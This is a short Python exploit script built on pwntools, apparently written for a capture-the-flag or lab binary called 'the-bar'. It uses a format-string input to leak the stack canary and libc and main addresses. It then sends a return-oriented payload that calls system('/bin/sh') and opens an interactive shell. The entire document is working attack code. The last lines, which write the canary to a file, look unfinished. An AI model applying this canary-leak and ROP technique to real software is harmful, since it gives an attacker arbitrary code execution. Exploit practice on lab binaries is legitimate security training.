from pwn import *

context.clear(arch='amd64')
p = process('./the-bar')

canary_offset = 24
ret_offset = 40
gadget1_offset = 141
gadget2_offset = -528
system_offset = 150368
exit_offset = 104448
binsh_offset = 1492263

exploit_str1 = '%9$llx %15$llx %11$llx'
p.sendline(exploit_str1)

data = p.recvline().split()

canary = int('0x'+data[0], 0)
print 'canary: ' + hex(canary)
libc_addr = int('0x'+data[1], 0)
print 'libc_addr: ' + hex(libc_addr)
main_addr = int('0x'+data[2], 0)
print 'main_addr: ' + hex(main_addr)

gadget1_addr = main_addr+gadget1_offset
print 'gadget1_addr: ' + hex(gadget1_addr)
gadget2_addr = main_addr+gadget2_offset
print 'gadget2_addr: ' + hex(gadget2_addr)

system_addr = libc_addr+system_offset
print 'system_addr: ' + hex(system_addr)
exit_addr = libc_addr+exit_offset
print 'exit_addr: ' + hex(exit_addr)
binsh_addr = libc_addr+binsh_offset
print 'binsh_addr: ' + hex(binsh_addr)

exploit_str2 = flat({canary_offset:pack(canary), ret_offset:pack(gadget2_addr)}, pack(gadget1_addr), pack(binsh_addr), pack(system_addr), pack(exit_addr))
p.sendline(exploit_str2)

p.interactive()
p.corefile

exploit_file = open('exploit.in', 'w')
exploit_file.write(pack(canary))
